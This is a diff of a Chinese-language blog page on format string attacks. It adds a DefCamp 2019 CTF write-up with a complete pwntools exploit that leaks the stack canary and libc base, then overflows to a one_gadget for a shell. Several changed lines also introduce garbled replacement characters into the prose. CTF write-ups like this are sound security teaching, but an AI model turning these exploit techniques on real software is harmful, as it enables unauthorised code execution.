@@ -150,7 +150,7 @@
     <!-- Page Header -->
 <!-- Set your background image for this header in your post front-matter: cover -->
 
-<header class="intro-header" style="background-image: url('https://i.imgur.com/0YWlPp2.png')">
+<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
     <div class="container">
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
@@ -257,7 +257,7 @@ Below are some format parameters which can be used and their consequences:
 <p>我們可以2個bytes 2個bytes寫入, 這樣一次的量就不會那麼多<br>我們首先先寫入後4 bytes比較容易(因為前面都補0就好)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;hello&gt; = 0x080491a2</span><br><span class="line">0x91a2	= 37282</span><br></pre></td></tr></table></figure></p>
 <p>但我們的<code>37282</code>還需要扣掉address本身佔的4 bytes<br>所以是<code>37278</code></p>
 <p><img src="/img/Format_string_attack/liveformatstring15.png" alt=""></p>
-<p>這是一個小技巧，你要輸出37278個a也是可以<code>$x</code>前面加多少數字，他就會輸出多少個空格才輸出hex</p>
+<p>這是一個小技巧，你要輸出37278個a��是可以<code>$x</code>前面加多少數字，他就會輸出多少個空格才輸出hex</p>
 <p>我們用gdb trace看看</p>
 <p><img src="/img/Format_string_attack/liveformatstring16.png" alt=""></p>
 <p>這是輸入前的exit@GOT</p>
@@ -269,7 +269,7 @@ Below are some format parameters which can be used and their consequences:
 <p><img src="/img/Format_string_attack/liveformatstring19.png" alt=""></p>
 <p>我們看過這麼多次的objdump可以知道，一個記憶體位置是存一個byte<br>所以GOT應該也是一個位址存一個bytes, 存了四個bytes,<br>以little endian的方式存</p>
 <p>所以我們把address+2就會寫到前兩個位址的數值</p>
-<p>再來就是算數學了</p>
+<p>再來就是算���學了</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x10804=67588</span><br><span class="line">67588-37278-4-4=30302</span><br></pre></td></tr></table></figure>
 <p>我們一樣執行用gdb去看</p>
 <p><img src="/img/Format_string_attack/liveformatstring20.png" alt=""></p>
@@ -307,7 +307,7 @@ Below are some format parameters which can be used and their consequences:
 %hhn 代表寫入的長度限制為1bytes
 </code></pre><p>許多format string attack 的 exploit code 很常看到這種寫法，有些為求精確寫入，會 1 byte 1 byte 的改寫</p>
 <h1 id="espr"><a href="#espr" class="headerlink" title="espr"></a>espr</h1><p>影片：<a href="https://www.youtube.com/watch?v=XuzuFUGuQv0" target="_blank" rel="noopener">https://www.youtube.com/watch?v=XuzuFUGuQv0</a><br>題目：<a href="https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/pwn/espr" target="_blank" rel="noopener">https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/pwn/espr</a></p>
-<p>這題是很有意思的 Format string attack 的題目，出題隊伍 ESPR 在 HITCON CTF 2017 當導覽員的時候就見過他們，德國一支蠻有名的隊伍，33c3 CTF的題目就是他們出的</p>
+<p>這題是很有意思的 Format string attack 的題目，出題隊伍 ESPR 在 HITCON CTF 2017 當導覽員的時候就見過他們，德國一支蠻有名的隊伍，33c3 CTF的題目就���他們出的</p>
 <p>這題就是把他們的隊名出成題目</p>
 <p>題目只有一張圖片</p>
 <p><img src="/img/Format_string_attack/espr_small.jpg" alt=""></p>
@@ -335,7 +335,7 @@ Below are some format parameters which can be used and their consequences:
 <p><img src="/img/Format_string_attack/esprformatstring_8.png" alt=""></p>
 <p>我們就可以透過 GOT address 去 leak 他的 libc address</p>
 <p>但過程中我碰到一個小bug</p>
-<p>就是當我用 <code>u64</code> 想把我 recv 回來的 address unpack 的時候一直跳 error 說長度錯誤</p>
+<p>就是當我用 <code>u64</code> 想把我 recv 回來的 address unpack 的時候一���跳 error 說長度錯誤</p>
 <p>因此我用下面的code 進行 debug</p>
 <p><img src="/img/Format_string_attack/esprformatstring_9.png" alt=""></p>
 <p>結果是…</p>
@@ -368,7 +368,7 @@ Below are some format parameters which can be used and their consequences:
 <h1 id="Bypass-Stack-canary-amp-NX-amp-ASLR"><a href="#Bypass-Stack-canary-amp-NX-amp-ASLR" class="headerlink" title="Bypass Stack canary &amp; NX &amp; ASLR"></a>Bypass Stack canary &amp; NX &amp; ASLR</h1><p>一直想研究這個很久了，每次都只有口頭聽說 Format string attack 可以 byapss linux 那四個防禦機制，但都沒親身實測過</p>
 <p>網路上的資源也很少在說 bypass stack canary, 終於找到<a href="&quot;https://www.ret2rop.com/2018/08/format-string-defeating-stack-canary-nx-aslr-remote.html&quot;">這篇</a></p>
 <p>大概介紹一下 stack canary, 這個是 linux 為了防止buffer overflow所做的保護機制<br>他會在<del> rbp 與 return address 之間插入一個隨機值</del> rbp 之前插入一個隨機值<br>只要有人嘗試透過 buffer overflow 修改到這個隨機值，程式就會終止達到保護的目的</p>
-<p>我不清楚是不是每個linux都這樣，但我自己 trace 的結果是這樣，順便嘴一下誤導我的文章<br><a href="https://access.redhat.com/blogs/766093/posts/3548631" target="_blank" rel="noopener">https://access.redhat.com/blogs/766093/posts/3548631</a></p>
+<p>我不清楚是不是每���linux都這樣，但我自己 trace 的結果是這樣，順便嘴一下誤導我的文章<br><a href="https://access.redhat.com/blogs/766093/posts/3548631" target="_blank" rel="noopener">https://access.redhat.com/blogs/766093/posts/3548631</a></p>
 <p>圖畫錯啦！</p>
 <p>source code:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void center(void)</span><br><span class="line">&#123;</span><br><span class="line">  char code[128];</span><br><span class="line">  printf(&quot;Enter secret code !\nCode: &quot;);</span><br><span class="line">  gets(code);           //take input</span><br><span class="line">  printf(&quot;Entered Command center with code &gt; %s .\n&quot;,code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char name[64];</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);        //no buffering in stdin and stdout</span><br><span class="line">    setvbuf(stdout, 0, 2, 0);</span><br><span class="line">    memset(name, 0, sizeof(name));      //fill name buffer with null bytes</span><br><span class="line">    printf(&quot;What is your name?\nName: &quot;);</span><br><span class="line">    read(0, name, 64);          //read 64 bytes from stdin(0) to name</span><br><span class="line">    printf(&quot;Hello &quot;); printf(name);</span><br><span class="line">    center();               //call center function</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -416,12 +416,43 @@ Below are some format parameters which can be used and their consequences:
 <p><code>0x90 - 0x8 = 136</code></p>
 <p>他們之間的關係大概是 canary -&gt; rbp address -&gt; ret address (根據看的方向也可能倒過來)</p>
 <p>都知道了之後我們就能來進行拿 shell 的動作啦~</p>
-<p>直接跳 one gadget 可以省很多力</p>
+<p>直接跳 one gadget 可��省很多力</p>
 <p><img src="/img/Format_string_attack/bypass_formatstring_12.png" alt=""></p>
 <p>exploit code:</p>
 <p><img src="/img/Format_string_attack/bypass_formatstring_13.png" alt=""></p>
 <p>簡單來說 payload 的構成是 <code>junk(136) + canary(8) + rbp_junk(8) + ret_address(8)</code></p>
 <p>教學多 call <code>setuid(0)</code> 來確保拿到的權限是 root 但我是在kali 就算了。</p>
+<h1 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h1><p>這一題是defcamp 2019的題目，邊複習這篇邊解出來了XDD<br>就順便貼上來</p>
+<p>checksec:<br><img src="/img/Format_string_attack/defcamp2019_secret_0.png" alt=""></p>
+<p>保護幾乎全開，然後有format string 的問題</p>
+<p><img src="/img/Format_string_attack/defcamp2019_secret_1.png" alt=""></p>
+<p>用r2看一下他,<br><code>main</code> 裡面存在format string的問題，<br><img src="/img/Format_string_attack/defcamp2019_secret_2.png" alt=""><br>並且在 <code>secret</code> 裡面存在overflow的問題<br><img src="/img/Format_string_attack/defcamp2019_secret_3.png" alt=""><br>strcmp下面沒有吐出flag的相關程式碼，意思是就算猜對也不會給你答案，所以我們直接拿shell<br><img src="/img/Format_string_attack/defcamp2019_secret_4.png" alt=""></p>
+<p>一樣，因為我們要先找到<code>canary</code>的offset才能進行overflow<br>我們透過輸入<br><code>%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|</code><br>取得canary的value</p>
+<p>透過 gdb 可以輕易取得leak canary的offset<br><img src="/img/Format_string_attack/defcamp2019_secret_5.png" alt=""></p>
+<p><img src="/img/Format_string_attack/defcamp2019_secret_6.png" alt=""></p>
+<p>可以知道大概在第15個offset</p>
+<p>那因為有長度限制，我們無法一直leak到16以後，</p>
+<p>我們現在至少知道了第15個是canary, 第16個是<code>__libc_csu_init</code>的位置</p>
+<p>為什麼知道呢？因為每一次執行他的最後1.5個byte都是<code>c40</code>結尾</p>
+<p>符合<code>__libc_csu_init</code>的結尾</p>
+<p><img src="/img/Format_string_attack/defcamp2019_secret_7.png" alt=""></p>
+<p>這樣我們就能leak出 <code>program base</code> 了</p>
+<p>但除了leak <code>program base</code> 還不夠，我們需要能leak libc address</p>
+<p>其實找libc address可以透過他的位址特性—無論前面位址怎麼變最後1.5個byte都不會變</p>
+<p>看到最後1.5個byte不會變的位址，再用gdb去看他對應的 function 是什麼</p>
+<p>理論上來說 format string 是能leak出 stack 的內容，而 main 的return address<br><code>__libc_start_main</code>也會放在stack內，所以基本上都能leak出來</p>
+<p>在第17個offset我們就找到 libc 的 address 了</p>
+<p>我們輸入 <code>%15$lx %16$lx %17$lx</code> 之後出現了三個 address</p>
+<p><img src="/img/Format_string_attack/defcamp2019_secret_8.png" alt=""></p>
+<p>我們挑最後一個來看</p>
+<p><img src="/img/Format_string_attack/defcamp2019_secret_9.png" alt=""></p>
+<p>可以看到裡面的記憶體區段屬於libc的區段，所以我們只要把這個位址扣掉 235</p>
+<p><img src="/img/Format_string_attack/defcamp2019_secret_10.png" alt=""></p>
+<p>就會得到 <code>__libc_start_main</code> 的開頭位址, 在有libc版本的情況下就可以取得libc_base</p>
+<p>進一步可以透過one_gadget然後用overflow取得shell</p>
+<p>exploit:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = &apos;bash&apos;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def leak_offset(payload):</span><br><span class="line">    io = process(&quot;./pwn_secret&quot;)</span><br><span class="line">    io.recvuntil(&quot;Name: &quot;)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(&quot;Hillo &quot;)</span><br><span class="line">    info = io.recv()</span><br><span class="line">    io.close()</span><br><span class="line">    return info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(leak_offset)</span><br><span class="line">print autofmt.offset</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">leak_offset = 6</span><br><span class="line">canary_offset = 15</span><br><span class="line">overflow_offset = 0x90-0x8</span><br><span class="line">binELF = ELF(&quot;./secret&quot;)</span><br><span class="line">libcELF = ELF(&quot;./libc-2.29.so&quot;)</span><br><span class="line"></span><br><span class="line">read_got = binELF.got[&apos;read&apos;]</span><br><span class="line">printf_got = binELF.got[&apos;printf&apos;]</span><br><span class="line">libc_start_main_libc = libcELF.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">leak = &quot;%15$lx&quot; + &quot; &quot; + &quot;%16$lx&quot; + &quot; &quot; + &quot;%17$lx&quot;</span><br><span class="line"></span><br><span class="line">#leak = &quot;|%17$lx|%18$lx|%19$lx|%20$lx|%21$lx&quot;</span><br><span class="line">#leak = &quot;%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|&quot;</span><br><span class="line">io = process(&quot;secret&quot;)</span><br><span class="line">io.recvuntil(&quot;Name: &quot;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(leak)</span><br><span class="line">raw = io.recvline().split(&quot; &quot;)</span><br><span class="line">canary = int(raw[1], 16)</span><br><span class="line">program_base = int(raw[2], 16) - 0xc40</span><br><span class="line">#use gdb to trace in you will find main&apos;s return address is &lt;libc_start_main + 235&gt;</span><br><span class="line">libc_start_main = int(raw[3], 16) - 235</span><br><span class="line">libc_base = libc_start_main - libc_start_main_libc</span><br><span class="line">log.info(&quot;canary is %x&quot; %canary)</span><br><span class="line">log.info(&quot;program_base is %x&quot; %program_base)</span><br><span class="line">log.info(&quot;libc_start_main is %x&quot; %libc_start_main)</span><br><span class="line">log.info(&quot;libc base is %x&quot; %libc_base)</span><br><span class="line"></span><br><span class="line">one = libc_base + 0xe664b</span><br><span class="line"></span><br><span class="line">overflow = &quot;a&quot;*overflow_offset + p64(canary) + &apos;bbbbbbbb&apos;  +p64(one)</span><br><span class="line">print(repr(p64(canary)))</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;ase: &quot;)</span><br><span class="line">io.sendline(overflow)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>喔還有一點，因為程式有 call <code>alarm</code>，太惱人了，所以我有把他patch成 <code>isnan</code></p>
+<p><img src="/img/Format_string_attack/defcamp2019_secret_11.png" alt=""></p>
 
 
                 
@@ -469,7 +500,7 @@ Below are some format parameters which can be used and their consequences:
 
                     
                 </ul>
-                <p class="copyright text-muted">&copy; 2019 AStar<br></p>
+                <p class="copyright text-muted">&copy; 2020 AStar<br></p>
                 <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
                 <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
             </div>
